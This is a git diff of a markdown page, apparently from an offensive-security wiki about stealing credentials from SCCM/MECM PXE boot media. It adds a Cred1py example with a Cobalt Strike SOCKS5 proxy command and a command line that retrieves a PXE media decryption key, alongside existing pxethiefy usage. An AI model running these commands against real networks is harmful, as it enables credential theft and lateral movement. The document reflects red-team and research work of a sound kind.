@@ -53,6 +53,7 @@ With these credentials, attackers may transition from an unauthenticated context
 
 
 ## Examples
+### Pxethiefy.py
 Using pxethiefy from a Linux machine with network access to retrieve a PXE media file with no password set:
 ```
 testsubject4@sphere4:~$ sudo python3 pxethiefy.py explore -i eth0 -a atlas.aperture.local
@@ -79,6 +80,20 @@ Sent 1 packets.
 
 6C458FCF53D0A6D2DBA446F1C0414FAD1E03A89D8481E26D7C1BED1E71FDC3272C701020207D0" -s -c PS1 -mp atlas.aperture.local
 ```
+### Cred1py
+Using Cred1py from a Linux machine over a UDP SOCKS5 proxy to retrieve the decryption key for a PXE media file:
+
+On Cobalt Strike, enable UDP SOCKS5 proxy on port 9090:
+
+```
+socks 9090 socks5 enableNoAuth a b
+```
+
+Then execute Cred1py with:
+
+```
+testsubject4@sphere4:~$ python3 ./main.py 10.0.1.200 10.0.2.4 TS-HOST 9090
+```
 
 ## References
 - Christopher Panayi, [Identifying and Retrieving Credentials From SCCM/MECM Task Sequences](https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences)
@@ -87,3 +102,4 @@ Sent 1 packets.
 - Christopher Panayi, [AES-128 ConfigMgr CryptDeriveKey Hashcat Module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module)
 - Carsten Sandker, [pxethiefy](https://github.com/csandker/pxethiefy)
 - Microsoft, [Understanding PXE Boot](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot#)
+- SpecterOps, [Cred1py](https://github.com/specterops/Cred1py)
